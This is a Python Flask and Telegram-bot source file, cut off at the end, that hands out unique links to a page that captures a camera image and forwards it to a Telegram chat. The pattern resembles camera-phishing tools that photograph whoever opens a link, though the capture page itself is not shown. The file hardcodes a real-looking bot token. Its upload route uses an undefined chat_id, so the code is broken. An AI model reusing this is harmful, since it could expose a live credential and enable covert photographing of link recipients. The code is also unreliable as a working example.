from flask import Flask, render_template, request, jsonify, send_file
import sqlite3
import base64
from io import BytesIO
import telegram
import uuid

app = Flask(__name__)

# Замените 'YOUR_TELEGRAM_BOT_TOKEN' на токен вашего бота
TELEGRAM_BOT_TOKEN = '6302417851:AAHXsKMvJ6_gYW15HxDhGKQFxg_ktJsD-qQ'
bot = telegram.Bot(token=TELEGRAM_BOT_TOKEN)

# Функция инициализации базы данных
def init_db():
    conn = sqlite3.connect('database/images.db')
    cursor = conn.cursor()
    
    # Создание таблицы пользователей
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id TEXT PRIMARY KEY,
            chat_id TEXT NOT NULL
        )
    ''')
    
    # Создание таблицы изображений
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS images (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT NOT NULL,
            image_data BLOB NOT NULL,
            FOREIGN KEY (user_id) REFERENCES users (id)
        )
    ''')
    
    conn.commit()
    conn.close()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/generate_link/<chat_id>', methods=['POST'])
def generate_link(chat_id):
    user_id = str(uuid.uuid4())
    conn = sqlite3.connect('database/images.db')
    cursor = conn.cursor()
    cursor.execute("INSERT INTO users (id, chat_id) VALUES (?, ?)", (user_id, chat_id))
    conn.commit()
    conn.close()
    link = f'http://127.0.0.1:5000/capture/{user_id}'
    bot.send_message(chat_id=chat_id, text=f'Here is your unique link for capturing a selfie: {link}')
    return jsonify({'status': 'success'})

@app.route('/capture/<user_id>')
def capture(user_id):
    return render_template('capture.html', user_id=user_id)

@app.route('/upload/<user_id>', methods=['POST'])
def upload(user_id):
    data = request.get_json()
    img_data = data['image']
    img_data = img_data.split(',')[1]  # Удаляем префикс "data:image/png;base64,"
    img_data = base64.b64decode(img_data)  # Декодируем из base64

    # Сохранение изображения в базу данных
    conn = sqlite3.connect('database/images.db')
    cursor = conn.cursor()
    cursor.execute("INSERT INTO images (user_id, image_data) VALUES (?, ?)", (user_id, img_data))
    conn.commit()
    conn.close()

    # Отправка изображения в Telegram
    bot.send_photo(chat_id=chat_id, photo=BytesIO(img_data))

    return jsonify({'status': 'success'})

@app.route('/webhook', methods=['POST'])
def webhook():
    update = telegram.Update.de_json(request.get_json(force=True), bot)
    chat_id = update.message.chat.id

    if update.message.text == '/start':
        generate_link(chat_id)
    return jsonify({'status': 'ok'})

if __name__ == '__main__':
    init_db()  # Ини